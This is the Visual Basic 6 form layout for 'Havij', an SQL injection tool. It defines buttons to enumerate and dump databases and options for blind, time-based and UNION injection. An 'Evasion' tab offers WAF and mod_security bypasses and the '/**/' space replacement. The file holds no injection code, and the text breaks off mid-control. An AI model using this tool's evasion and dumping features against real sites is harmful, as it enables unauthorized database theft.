VERSION 5.00
Object = "{BDC217C8-ED16-11CD-956C-0000C04E4C0A}#1.0#0"; "TABCTL32.OCX"
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.0#0"; "COMDLG32.OCX"
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.0#0"; "RICHTX32.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1
   Caption         =   "Havij"
   ClientHeight    =   10815
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   9975
   Icon            =   "FORM01.FRX":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   721
   ScaleMode       =   3
   ScaleWidth      =   665
   StartUpPosition =   2
   Begin VB.Frame frmMain
      Height          =   4695
      Index           =   2
      Left            =   360
      TabIndex        =   14
      Top             =   3120
      Width           =   9255
      Begin VB.PictureBox picSizeWE
         BorderStyle     =   0
         Height          =   2415
         Left            =   3120
         MousePointer    =   9
         ScaleHeight     =   2415
         ScaleWidth      =   135
         TabIndex        =   156
         Top             =   885
         Width           =   135
      End
      Begin VB.PictureBox picSizeWEtick
         BackColor       =   &H80000010&
         Height          =   3495
         Left            =   3120
         ScaleHeight     =   3435
         ScaleWidth      =   75
         TabIndex        =   157
         Top             =   885
         Width           =   135
      End
      Begin VB.PictureBox picChkGroup
         BorderStyle     =   0
         Height          =   255
         Left            =   360
         ScaleHeight     =   255
         ScaleWidth      =   8535
         TabIndex        =   85
         Top             =   4320
         Width           =   8535
         Begin VB.CheckBox chkClear
            Caption         =   "Clear list on get"
            Height          =   195
            Left            =   6120
            TabIndex        =   158
            ToolTipText     =   "Remove this check if you want to continue previous table/column extraction"
            Top             =   0
            Value           =   1
            Width           =   1935
         End
         Begin VB.CheckBox chkForceAllinOne
            Caption         =   "Force to use it"
            Height          =   255
            Left            =   4560
            TabIndex        =   93
            ToolTipText     =   "Check this option if you want to use 'All in one request' forcefully"
            Top             =   0
            Width           =   1575
         End
         Begin VB.CheckBox chkAllinOne
            Caption         =   "All in one request."
            Height          =   255
            Left            =   2880
            TabIndex        =   87
            Top             =   0
            Width           =   1695
         End
         Begin VB.CheckBox chkGroup
            Caption         =   "Use Group_Concat (MySQL Only)"
            Height          =   255
            Left            =   0
            TabIndex        =   86
            Top             =   0
            Width           =   2895
         End
      End
      Begin MSComctlLib.Toolbar tlbTables
         Height          =   540
         Left            =   120
         TabIndex        =   15
         Top             =   240
         Width           =   8895
         _ExtentX        =   15690
         _ExtentY        =   953
         _Version        =   393216
         AllowCustomize  =   0
         Wrappable       =   0
         ButtonWidth     =   1773
         ButtonHeight    =   953
         Style           =   1
         ImageList       =   "imlToolBar"
         DisabledImageList =   "imlToolBarDisabled"
         BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628}
            NumButtons      =   9
            BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Enabled         =   0
               Object.Width    =   1500
               Caption         =   "Stop"
               ImageKey        =   "stop"
            EndProperty
            BeginProperty Button2 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Style           =   3
            EndProperty
            BeginProperty Button3 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "Get DBs"
               Key             =   "getdbs"
               ImageKey        =   "db"
            EndProperty
            BeginProperty Button4 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "Get Tables"
               ImageKey        =   "gettables"
            EndProperty
            BeginProperty Button5 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "Get Columns"
               ImageKey        =   "getcolumns"
            EndProperty
            BeginProperty Button6 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Style           =   5
               Caption         =   "Get Data"
               ImageKey        =   "getdata"
               BeginProperty ButtonMenus {66833FEC-8583-11D1-B16A-00C0F0283628}
                  NumButtonMenus  =   4
                  BeginProperty ButtonMenu1 {66833FEE-8583-11D1-B16A-00C0F0283628}
                     Text            =   "Filter:"
                     Key             =   "filter"
                  EndProperty
                  BeginProperty ButtonMenu2 {66833FEE-8583-11D1-B16A-00C0F0283628}
                     Text            =   "Start Row: 1"
                     Key             =   "start"
                  EndProperty
                  BeginProperty ButtonMenu3 {66833FEE-8583-11D1-B16A-00C0F0283628}
                     Text            =   "Dump into File"
                     Key             =   "dump"
                  EndProperty
                  BeginProperty ButtonMenu4 {66833FEE-8583-11D1-B16A-00C0F0283628}
                     Text            =   "Save as XML"
                     Key             =   "SaveXML"
                  EndProperty
               EndProperty
            EndProperty
            BeginProperty Button7 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Style           =   3
            EndProperty
            BeginProperty Button8 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "Save Tables"
               ImageKey        =   "save"
            EndProperty
            BeginProperty Button9 {66833FEA-8583-11D1-B16A-00C0F0283628}
               Caption         =   "Save Data"
               ImageKey        =   "save"
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.TreeView TablesTree
         Height          =   3420
         Left            =   360
         TabIndex        =   22
         Top             =   885
         Width           =   2775
         _ExtentX        =   4895
         _ExtentY        =   6033
         _Version        =   393217
         LineStyle       =   1
         Style           =   7
         Indentation     =   441
         Checkboxes      =   -1
         BorderStyle     =   1
         Appearance      =   0
         PathSeparator   =   "."
      End
      Begin Project1.LynxGrid lstData
         Height          =   3420
         Left            =   3240
         TabIndex        =   59
         Top             =   885
         Width           =   5640
         _extentx        =   9948
         _extenty        =   6033
         BeginProperty font {0BE35203-8F91-11CE-9DE3-00AA004BB851}
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         BeginProperty fontheader {0BE35203-8F91-11CE-9DE3-00AA004BB851}
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0
            Italic          =   0
            Strikethrough   =   0
         EndProperty
         backcolorbkg    =   16777215
         backcolorsel    =   65535
         forecolorsel    =   0
         customcolorfrom =   16572875
         customcolorto   =   14722429
         gridcolor       =   16367254
         focusrectmode   =   2
         focusrectcolor  =   128
         gridlines       =   3
         themecolor      =   5
         appearance      =   0
         showrownumbersvary =  -1
         allowcolumnresizing =  -1
         columndrag      =  -1
         columnsort      =  -1
         editable        =  -1
         allowdelete     =  -1
         allowinsert     =  -1
         focusrowhighlightstyle =   1
      End
   End
   Begin VB.Frame frmMain
      Height          =   4695
      Index           =   4
      Left            =   360
      TabIndex        =   16
      Top             =   3120
      Width           =   9255
      Begin VB.PictureBox picBack
         BorderStyle     =   0
         Height          =   4245
         Index           =   1
         Left            =   240
         ScaleHeight     =   4245
         ScaleWidth      =   8775
         TabIndex        =   68
         Top             =   270
         Width           =   8775
         Begin TabDlg.SSTab SSTab1
            Height          =   4215
            Left            =   0
            TabIndex        =   94
            Top             =   0
            Width           =   8775
            _ExtentX        =   15478
            _ExtentY        =   7435
            _Version        =   393216
            TabHeight       =   520
            BackColor       =  -2147483633
            TabCaption(0)   =   "General"
            TabPicture(0)   =   "FORM01.FRX":628A
            Tab(0).ControlCount =   21
            Tab(0).ControlEnabled =   -1
            Tab(0).Control(0) =   "Label20"
            Tab(0).Control(1) =   "Label6"
            Tab(0).Control(2) =   "Label31"
            Tab(0).Control(3) =   "Label21"
            Tab(0).Control(4) =   "Label30"
            Tab(0).Control(5) =   "Label38"
            Tab(0).Control(6) =   "Label39"
            Tab(0).Control(7) =   "Toolbar7"
            Tab(0).Control(8) =   "txtStartColCount"
            Tab(0).Control(9) =   "Check4"
            Tab(0).Control(10) =   "txtMaxColCount"
            Tab(0).Control(11) =   "Check2"
            Tab(0).Control(12) =   "Check9"
            Tab(0).Control(13) =   "Check11"
            Tab(0).Control(14) =   "Check10"
            Tab(0).Control(15) =   "txtProxy"
            Tab(0).Control(16) =   "txtProxyPort"
            Tab(0).Control(17) =   "Check7"
            Tab(0).Control(18) =   "txtHeaders"
            Tab(0).Control(19) =   "txtinjTimeout"
            Tab(0).Control(20) =   "txtDefaultValue"
            TabCaption(1)   =   "Evasion"
            TabPicture(1)   =   "FORM01.FRX":62A6
            Tab(1).ControlCount =   11
            Tab(1).ControlEnabled =   0
            Tab(1).Control(0) =   "chkBypassWebknight"
            Tab(1).Control(1) =   "chkReplacement"
            Tab(1).Control(2) =   "cmdAddrep"
            Tab(1).Control(3) =   "cmdDelrep"
            Tab(1).Control(4) =   "cmbRepSpace"
            Tab(1).Control(5) =   "Check3"
            Tab(1).Control(6) =   "Check12"
            Tab(1).Control(7) =   "Check6"
            Tab(1).Control(8) =   "Check5"
            Tab(1).Control(9) =   "lstReplacement"
            Tab(1).Control(10) =   "Toolbar8"
            TabCaption(2)   =   "Blind"
            TabPicture(2)   =   "FORM01.FRX":62C2
            Tab(2).ControlCount =   17
            Tab(2).ControlEnabled =   0
            Tab(2).Control(0) =   "Command2"
            Tab(2).Control(1) =   "txtColumns"
            Tab(2).Control(2) =   "Command1"
            Tab(2).Control(3) =   "txtTables"
            Tab(2).Control(4) =   "chkclmPrefix"
            Tab(2).Control(5) =   "txtColumnPrefix"
            Tab(2).Control(6) =   "chktblPrefix"
            Tab(2).Control(7) =   "txtTablePrefix"
            Tab(2).Control(8) =   "cmbWaittime"
            Tab(2).Control(9) =   "txtBlindMinChar"
            Tab(2).Control(10) =   "txtBlindMaxChar"
            Tab(2).Control(11) =   "Toolbar9"
            Tab(2).Control(12) =   "Label34"
            Tab(2).Control(13) =   "Label32"
            Tab(2).Control(14) =   "Label18"
            Tab(2).Control(15) =   "Label35"
            Tab(2).Control(16) =   "Label37"
            Begin VB.TextBox txtDefaultValue
               Height          =   285
               Left            =   6720
               TabIndex        =   142
               Text            =   "1"
               Top             =   1440
               Width           =   495
            End
            Begin VB.CheckBox chkBypassWebknight
               Caption         =   "Bypass WebKnight WAF"
               Height          =   255
               Left            =  -74760
               TabIndex        =   141
               Top             =   1560
               Width           =   2535
            End
            Begin VB.TextBox txtinjTimeout
               Height          =   285
               Left            =   6720
               TabIndex        =   139
               Text            =   "60"
               Top             =   960
               Width           =   495
            End
            Begin VB.CommandButton Command2
               Caption         =   "..."
               Height          =   285
               Left            =  -69600
               TabIndex        =   135
               Top             =   3000
               Width           =   375
            End
            Begin VB.TextBox txtColumns
               Height          =   285
               Left            =  -72360
               TabIndex        =   133
               Text            =   "Columns.txt"
               Top             =   3000
               Width           =   2775
            End
            Begin VB.CommandButton Command1
               Caption         =   "..."
               Height          =   285
               Left            =  -69600
               TabIndex        =   132
               Top             =   2520
               Width           =   375
            End
            Begin VB.TextBox txtTables
               Height          =   285
               Left            =  -72360
               TabIndex        =   130
               Text            =   "Tables.txt"
               Top             =   2520
               Width           =   2775
            End
            Begin VB.CheckBox chkclmPrefix
               Caption         =   "Blind column prefix:"
               Height          =   255
               Left            =  -74760
               TabIndex        =   129
               Top             =   2040
               Width           =   2055
            End
            Begin VB.TextBox txtColumnPrefix
               Enabled         =   0
               Height          =   285
               Left            =  -72360
               TabIndex        =   128
               Text            =   "clm_"
               Top             =   2040
               Width           =   735
            End
            Begin VB.CheckBox chktblPrefix
               Caption         =   "Blind table prefix:"
               Height          =   255
               Left            =  -74760
               TabIndex        =   127
               Top             =   1560
               Width           =   1695
            End
            Begin VB.TextBox txtTablePrefix
               Enabled         =   0
               Height          =   285
               Left            =  -72360
               TabIndex        =   126
               Text            =   "tbl_"
               Top             =   1560
               Width           =   735
            End
            Begin VB.CheckBox chkReplacement
               Caption         =   "Replacement"
               Height          =   255
               Left            =  -74760
               TabIndex        =   125
               Top             =   2280
               Width           =   2055
            End
            Begin VB.CommandButton cmdAddrep
               Caption         =   "+"
               Enabled         =   0
               Height          =   255
               Left            =  -70560
               TabIndex        =   123
               Top             =   2280
               Width           =   255
            End
            Begin VB.CommandButton cmdDelrep
               Caption         =   "-"
               Enabled         =   0
               Height          =   255
               Left            =  -70800
               TabIndex        =   124
               Top             =   2280
               Width           =   255
            End
            Begin VB.TextBox txtHeaders
               Height          =   1935
               Left            =   240
               MultiLine       =  -1
               ScrollBars      =   3
               TabIndex        =   118
               Text            =   "FORM01.FRX":62DE
               Top             =   1800
               Width           =   4335
            End
            Begin VB.CheckBox Check7
               Caption         =   "Http headers:"
               Height          =   255
               Left            =   240
               TabIndex        =   117
               Top             =   1440
               Value           =   1
               Width           =   1335
            End
            Begin VB.TextBox txtProxyPort
               Enabled         =   0
               Height          =   285
               Left            =   3840
               TabIndex        =   116
               Text            =   "8080"
               Top             =   480
               Width           =   615
            End
            Begin VB.TextBox txtProxy
               Enabled         =   0
               Height          =   285
               Left            =   1200
               TabIndex        =   115
               Top             =   480
               Width           =   2535
            End
            Begin VB.CheckBox Check10
               Caption         =   "Proxy:"
               Height          =   255
               Left            =   240
               TabIndex        =   114
               Top             =   480
               Width           =   855
            End
            Begin VB.ComboBox cmbWaittime
               Height          =   315
               ItemData        =   "FORM01.FRX":6367
               Left            =  -72360
               List            =   "FORM01.FRX":634B
               TabIndex        =   112
               Text            =   "Auto"
               Top             =   1080
               Width           =   735
            End
            Begin VB.TextBox txtBlindMinChar
               Height          =   285
               Left            =  -72360
               TabIndex        =   109
               Text            =   "30"
               Top             =   600
               Width           =   735
            End
            Begin VB.TextBox txtBlindMaxChar
               Height          =   285
               Left            =  -71280
               TabIndex        =   108
               Text            =   "128"
               Top             =   600
               Width           =   615
            End
            Begin VB.ComboBox cmbRepSpace
               Enabled         =   0
               Height          =   315
               ItemData        =   "FORM01.FRX":639B
               Left            =  -72960
               List            =   "FORM01.FRX":6377
               TabIndex        =   107
               Text            =   "/**/"
               Top             =   1920
               Width           =   735
            End
            Begin VB.CheckBox Check3
               Caption         =   "Replace space with:"
               Height          =   255
               Left            =  -74760
               TabIndex        =   106
               Top             =   1920
               Width           =   1815
            End
            Begin VB.CheckBox Check12
               Caption         =   "Bypass mod_security"
               Height          =   255
               Left            =  -74760
               TabIndex        =   105
               Top             =   1200
               Width           =   2055
            End
            Begin VB.CheckBox Check6
               Caption         =   "Avoid using strings (good for bypassing magic_quotes and similar filters)"
               Height          =   255
               Left            =  -74760
               TabIndex        =   104
               Top             =   480
               Value           =   1
               Width           =   5535
            End
            Begin VB.CheckBox Check5
               Caption         =   "Bypass illegal union (for fixing language problems)"
               Height          =   255
               Left            =  -74760
               TabIndex        =   103
               Top             =   840
               Value           =   1
               Width           =   3975
            End
            Begin VB.CheckBox Check11
               Caption         =   "Follow redirections"
               Height          =   255
               Left            =   4800
               TabIndex        =   100
               Top             =   2400
               Width           =   1935
            End
            Begin VB.CheckBox Check9
               Caption         =   "Do not find columns count in MsSQL with error."
               Height          =   255
               Left            =   4800
               TabIndex        =   99
               ToolTipText     =   "There is no need to columns count because havij use convert method."
               Top             =   1920
               Value           =   1
               Width           =   3735
            End
            Begin VB.CheckBox Check2
               Caption         =   "Show Requests"
               Height          =   255
               Left            =   4800
               TabIndex        =   98
               Top             =   2880
               Width           =   1695
            End
            Begin VB.TextBox txtMaxColCount
               Height          =   285
               Left            =   6720
               TabIndex        =   97
               Text            =   "32"
               Top             =   480
               Width           =   495
            End
            Begin VB.CheckBox Check4
               Caption         =   "Try different syntaxes in UNION injections."
               Height          =   255
               Left            =   240
               TabIndex        =   96
               Top             =   960
               Width           =   3615
            End
            Begin VB.TextBox txtStartColCount
               Height          =   285
               Left            =   6000
               TabIndex        =   95
               Text            =   "1"
               Top             =   480
               Width           =   375
            End
            Begin MSComctlLib.ListView lstReplacement
               Height          =   1335
               Left            =  -74760
               TabIndex        =   122
               Top             =   2520
               Width           =   4455
               _ExtentX        =   7858
               _ExtentY        =   2355
               _Version        =   393217
               View            =   3
               LabelWrap       =   -1
               FullRowSelect   =   -1
               BorderStyle     =   1
               Enabled         =   0
               Appearance      =   1
               ForeColor       =  -2147483640
               BackColor       =  -2147483643
               NumItems        =   2
               BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628}
                  Text            =   "Find what"
                  Object.Width           =   3528
               EndProperty
               BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628}
                  SubItemIndex    =   1
                  Text            =   "Replace with"
                  Object.Width           =   3528
               EndProperty
            End
            Begin MSComctlLib.Toolbar Toolbar7
               Height          =   540
               Left            =   7440
               TabIndex        =   136
               Top             =   3360
               Width           =   735
               _ExtentX        =   1296
               _ExtentY        =   953
               _Version        =   393216
               AllowCustomize  =   0
               Wrappable       =   0
               ButtonWidth     =   979
               ButtonHeight    =   953
               Style           =   1
               ImageList       =   "imlToolBar"
               DisabledImageList =   "imlToolBarDisabled"
               BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628}
                  NumButtons      =   1
                  BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628}
                     Caption         =   " Apply"
                     ImageKey        =   "ok"
                  EndProperty
               EndProperty
            End
            Begin MSComctlLib.Toolbar Toolbar8
               Height          =   540
               Left            =  -67560
               TabIndex        =   137
               Top             =   3360
               Width           =   735
               _ExtentX        =   1296
               _ExtentY        =   953
               _Version        =   393216
               AllowCustomize  =   0
               Wrappable       =   0
               ButtonWidth     =   979
               ButtonHeight    =   953
               Style           =   1
               ImageList       =   "imlToolBar"
               DisabledImageList =   "imlToolBarDisabled"
               BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628}
                  NumButtons      =   1
                  BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628}
                     Caption         =   " Apply"
                     ImageKey        =   "ok"
                  EndProperty
               EndProperty
            End
            Begin MSComctlLib.Toolbar Toolbar9
               Height          =   540
               Left            =  -67560
               TabIndex        =   138
               Top             =   3360
               Width           =   735
               _ExtentX        =   1296
               _ExtentY        =   953
               _Version        =   393216
               AllowCustomize  =   0
               Wrappable       =   0
               ButtonWidth     =   979
               ButtonHeight    =   953
               Style           =   1
               ImageList       =   "imlToolBar"
               DisabledImageList =   "imlToolBarDisabled"
               BeginProperty Buttons {66833FE8-8583-11D1-B16A-00C0F0283628}
                  NumButtons      =   1
                  BeginProperty Button1 {66833FEA-8583-11D1-B16A-00C0F0283628}
                     Caption         =   " Apply"
                     ImageKey        =   "ok"
                  EndProperty
               EndProperty
            End
            Begin VB.Label Label39
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "Default injection value:"
               Height          =   195
               Left            =   4800
               TabIndex        =   143
               Top             =   1440
               Width           =   1620
            End
            Begin VB.Label Label38
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "Time out (second):"
               Height          =   195
               Left            =   4800
               TabIndex        =   140
               Top             =   960
               Width           =   1320
            End
            Begin VB.Label Label34
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "Columns list for blind guessing:"
               Height          =   195
               Left            =  -74760
               TabIndex        =   134
               Top             =   3000
               Width           =   2145
            End
            Begin VB.Label Label32
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "Tables list for blind guessing:"
               Height          =   195
               Left            =  -74760
               TabIndex        =   131
               Top             =   2520
               Width           =   2025
            End
            Begin VB.Label Label30
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "Load Cookie"
               ForeColor       =   &H00FF0000&
               Height          =   195
               Left            =   2520
               MouseIcon       =   "FORM01.FRX":63B1
               MousePointer    =   99
               TabIndex        =   121
               Top             =   1440
               Width           =   900
            End
            Begin VB.Label Label21
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "User Agent"
               ForeColor       =   &H00FF0000&
               Height          =   195
               Left            =   1560
               MouseIcon       =   "FORM01.FRX":6503
               MousePointer    =   99
               TabIndex        =   120
               Top             =   1440
               Width           =   795
            End
            Begin VB.Label Label31
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "Authentication"
               ForeColor       =   &H00FF0000&
               Height          =   195
               Left            =   3600
               MouseIcon       =   "FORM01.FRX":6655
               MousePointer    =   99
               TabIndex        =   119
               Top             =   1440
               Width           =   1020
            End
            Begin VB.Label Label18
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "Time based method delay (ms):"
               Height          =   195
               Left            =  -74760
               TabIndex        =   113
               Top             =   1080
               Width           =   2190
            End
            Begin VB.Label Label35
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "to"
               Height          =   195
               Left            =  -71520
               TabIndex        =   111
               Top             =   600
               Width           =   255
            End
            Begin VB.Label Label37
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "Blind injection character ascii set:"
               Height          =   195
               Left            =  -74760
               TabIndex        =   110
               Top             =   600
               Width           =   2355
            End
            Begin VB.Label Label6
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "Column Count:"
               Height          =   195
               Left            =   4800
               TabIndex        =   102
               Top             =   480
               Width           =   1035
            End
            Begin VB.Label Label20
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "to"
               Height          =   195
               Left            =   6480
               TabIndex        =   101
               Top             =   480
               Width           =   135
            End
         End
      End
      Begin VB.PictureBox Picture3
         Height          =   15
         Left            =   7320
         ScaleHeight     =  -45
         ScaleWidth      =   75
         TabIndex        =   67
         Top             =   3960
         Width           =   135
      End
   End
   Begin VB.Frame frmMain
      Height          =   4695
      Index           =   0
      Left            =   360
      TabIndex        =   10
      Top             =   3120
      Width           =   9255
      Begin VB.PictureBox picBack
         BorderStyle     =   0
         Height          =   4095
         Index           =   2
         Left            =   2520
         ScaleHeight     =   4095
         ScaleWidth      =   4215
         TabIndex        =   69
         Top             =   360
         Width           =   4215
         Begin MSComctlLib.ListView lstDB
            Height          =   1335
            Left            =   0
            TabIndex        =   70
            Top             =   2640
            Width           =   4125
            _ExtentX        =   7276
            _ExtentY        =   2355
            _Version        =   393217
            View            =   3
            LabelEdit       =   1
            LabelWrap       =   -1
            HideSelection   =   -1
            HideColumnHeaders =   -1
            FullRowSelect   =   -1
            ForeColor       =  -2147483640
            BackColor       =  -2147483633
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851}
               Name            =   "Verdana"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
         End
         Begin VB.PictureBox Picture5
            Appearance      =   0
            BorderStyle     =   0
            ForeColor       =   &H80000008&
            Height          =   1455
            Left            =   0
            ScaleHeight     =   1455
            ScaleWidth      =   4215
            TabIndex        =   144
            Top             =   2640
            Width           =   4215
            Begin VB.PictureBox Picture6
               Appearance      =   0
               BorderStyle     =   0
               ForeColor       =   &H80000008&
               Height          =   1455
               Left            =  -120
               ScaleHeight     =   1455
               ScaleWidth      =   4215
               TabIndex        =   145
               Top             =   0
               Visible         =   0
               Width           =   4215
               Begin VB.Label lblRegisteredName
                  AutoSize        =  -1
                  BackStyle       =   0
                  Caption         =   "r3dm0v3"
                  Height          =   195
                  Left            =   240
                  TabIndex        =   147
                  Top             =   600
                  Width           =   615
               End
               Begin VB.Label Label40
                  AutoSize        =  -1
                  BackStyle       =   0
                  Caption         =   "This copy of Havij is registered to:"
                  Height          =   195
                  Left            =   120
                  TabIndex        =   146
                  Top             =   240
                  Width           =   2385
               End
            End
            Begin VB.TextBox txtName
               Height          =   285
               Left            =   720
               TabIndex        =   151
               Top             =   240
               Width           =   2175
            End
            Begin VB.CommandButton Command4
               Caption         =   "..."
               Height          =   285
               Left            =   2520
               TabIndex        =   150
               Top             =   720
               Width           =   375
            End
            Begin VB.TextBox txtRegFile
               Height          =   285
               Left            =   720
               TabIndex        =   149
               Top             =   720
               Width           =   1815
            End
            Begin VB.CommandButton Command3
               Caption         =   "Register"
               Height          =   735
               Left            =   3120
               TabIndex        =   148
               Top             =   240
               Width           =   855
            End
            Begin VB.Label Label43
               BeginProperty Font
                  Name            =   "Verdana"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0
                  Italic          =   0
                  Strikethrough   =   0
               EndProperty
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "Please connect to the internet and register"
               ForeColor       =   &H80000011&
               Height          =   195
               Left            =   240
               TabIndex        =   154
               Top             =   1080
               Width           =   3645
            End
            Begin VB.Label Label42
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "Name:"
               Height          =   195
               Left            =   120
               TabIndex        =   153
               Top             =   240
               Width           =   465
            End
            Begin VB.Label Label41
               AutoSize        =  -1
               BackStyle       =   0
               Caption         =   "File:"
               Height          =   195
               Left            =   120
               TabIndex        =   152
               Top             =   720
               Width           =   285
            End
         End
         Begin VB.Label Label44
            BeginProperty Font
               Name            =   "Verdana"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            AutoSize        =  -1
            BackStyle       =   0
            Caption         =   "Register"
            ForeColor       =   &H00FF0000&
            Height          =   195
            Left            =   3360
            TabIndex        =   155
            Top             =   2400
            Width           =   705
         End
         Begin VB.Label Label5
            BeginProperty Font
               Name            =   "Verdana"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            AutoSize        =  -1
            BackStyle       =   0
            Caption         =   "Check for update"
            ForeColor       =   &H00C00000&
            Height          =   210
            Left            =   2520
            MouseIcon       =   "FORM01.FRX":67A7
            MousePointer    =   99
            TabIndex        =   88
            Top             =   2040
            Width           =   1620
         End
         Begin VB.Label Label28
            BeginProperty Font
               Name            =   "Verdana"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            AutoSize        =  -1
            BackStyle       =   0
            Caption         =   "info@itsecteam.com"
            ForeColor       =   &H00C00000&
            Height          =   210
            Left            =   0
            MouseIcon       =   "FORM01.FRX":68F9
            MousePointer    =   99
            TabIndex        =   83
            Top             =   2040
            Width           =   1875
         End
         Begin VB.Label Label13
            BeginProperty Font
               Name            =   "Verdana"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            AutoSize        =  -1
            BackStyle       =   0
            Caption         =   "http://ITSecTeam.com"
            ForeColor       =   &H00C00000&
            Height          =   210
            Left            =   0
            MouseIcon       =   "FORM01.FRX":6A4B
            MousePointer    =   99
            TabIndex        =   78
            Top             =   1560
            Width           =   2070
         End
         Begin VB.Label Label7
            BeginProperty Font
               Name            =   "Verdana"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            AutoSize        =  -1
            BackStyle       =   0
            Caption         =   "Version 1.15 Pro"
            Height          =   210
            Left            =   1920
            TabIndex        =   77
            Top             =   600
            Width           =   1560
         End
         Begin VB.Image Image1
            Height          =   1020
            Left            =   0
            Picture         =   "FORM01.FRX":6B9D
            Top             =   480
            Width           =   1785
         End
         Begin VB.Label Label2
            BeginProperty Font
               Name            =   "Arial"
               Size            =   12
               Charset         =   0
               Weight          =   700
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            AutoSize        =  -1
            BackStyle       =   0
            Caption         =   "Havij - Advanced SQL Injection Tool"
            Height          =   285
            Left            =   0
            TabIndex        =   76
            Top             =   0
            Width           =   4080
         End
         Begin VB.Label Label3
            BeginProperty Font
               Name            =   "Verdana"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            AutoSize        =  -1
            BackStyle       =   0
            Caption         =   "Advanced SQL injection tool"
            Height          =   210
            Left            =   3480
            TabIndex        =   75
            Top             =   720
            Visible         =   0
            Width           =   2625
         End
         Begin VB.Label Label4
            BeginProperty Font
               Name            =   "Verdana"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            AutoSize        =  -1
            BackStyle       =   0
            Caption         =   "By r3dm0v3"
            Height          =   210
            Left            =   1920
            TabIndex        =   74
            Top             =   1080
            Width           =   1110
         End
         Begin VB.Label Label9
            BeginProperty Font
               Name            =   "Verdana"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            AutoSize        =  -1
            BackStyle       =   0
            Caption         =   "Databases:"
            ForeColor       =   &H00000000&
            Height          =   195
            Left            =   0
            TabIndex        =   73
            Top             =   2400
            Width           =   975
         End
         Begin VB.Label Label19
            BeginProperty Font
               Name            =   "Verdana"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            AutoSize        =  -1
            BackStyle       =   0
            Caption         =   "Copyright © 2009-2011"
            Height          =   210
            Left            =   1920
            TabIndex        =   72
            Top             =   840
            Width           =   2250
         End
         Begin VB.Label Label29
            BeginProperty Font
               Name            =   "Verdana"
               Size            =   9
               Charset         =   0
               Weight          =   400
               Underline       =   0
               Italic          =   0
               Strikethrough   =   0
            EndProperty
            AutoSize        =  -1
            BackStyle       =   0
            Caption         =   "http://forum.Itsecteam.com"
            ForeColor       =   &H00C00000&
            Height          =   210
            Left            =   0
            MouseIcon       =   "FORM01.FRX":C1AB
            MousePointer    =   99
            TabIndex        =   71
            Top             =   1800
            Width           =   2595
         End
      End
   End
   Begin VB.Frame frmMain
      Height          =   4695
      Index           =   5
      Left            =   360
      TabIndex        =   23
      Top             =   3120
      Width           =   9255
      Begin VB.ComboBox cmbCMD
         Height          =   315
         ItemData        =   "FORM01.FRX":C37D
         Left            =   1440
